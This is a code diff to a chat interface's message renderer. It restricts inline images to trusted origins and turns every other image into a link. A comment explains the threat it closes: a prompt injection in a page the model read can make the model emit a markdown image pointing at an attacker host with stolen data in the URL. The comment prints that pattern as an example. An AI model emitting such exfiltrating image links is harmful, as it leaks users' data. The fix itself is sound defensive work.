@@ -18,6 +18,23 @@ import type { HarnessAction } from '../../types/chat';
 import { AudioPlayerBubble } from './AudioPlayerBubble';
 import { CodeBlock } from './CodeBlock';
 import { BrandOverride } from '../brand/BrandLogo';
+
+// Image sources the transcript will load directly. Everything else becomes a
+// link (see the img renderer). Relative /api/image URLs are ours; blob: and
+// data: never leave the page; the Supabase project is where uploads live.
+const SUPABASE_ORIGIN = (() => {
+  try { return new URL(import.meta.env.VITE_SUPABASE_URL).origin; } catch { return ''; }
+})();
+function isTrustedImageSource(src: string): boolean {
+  if (src.startsWith('/api/image?') || src.startsWith('blob:') || src.startsWith('data:image/')) return true;
+  try {
+    const url = new URL(src, window.location.origin);
+    return url.origin === window.location.origin || (SUPABASE_ORIGIN !== '' && url.origin === SUPABASE_ORIGIN);
+  } catch {
+    return false;
+  }
+}
+
 import { MusicComposeCard, SavedVariation } from './MusicComposeCard';
 import type { Components } from 'react-markdown';
 import { isMarkdownCodeComplete } from './markdownRuntime';
@@ -335,15 +352,27 @@ function AIMessageComponent({
         return <GeneratedImage src={src} alt={alt || 'Generated image'} persona={displayPersona} />;
       }
 
-      // Fallback to regular image for other sources
-      return (
-        <img
-          src={src}
-          alt={alt}
-          className="max-w-full h-auto rounded-xl my-4"
-          loading="lazy"
-        />
-      );
+      // Any other image host renders as a link, not an <img>. A model that
+      // has read an attacker's page can be told to emit
+      // `![](https://attacker/?d=<whatever it just read>)`, and an <img> makes
+      // the browser send that request on render — the zero-tool version of
+      // data exfiltration (pre-launch-audit.md A.12). Our own hosts are the
+      // only ones an image may load from.
+      if (src && isTrustedImageSource(src)) {
+        return (
+          <img
+            src={src}
+            alt={alt}
+            className="max-w-full h-auto rounded-xl my-4"
+            loading="lazy"
+          />
+        );
+      }
+      return src ? (
+        <a href={src} target="_blank" rel="noopener noreferrer" className="underline break-all">
+          {alt || src}
+        </a>
+      ) : null;
     },
   }), [theme.text, personaColor, displayPersona]);
 
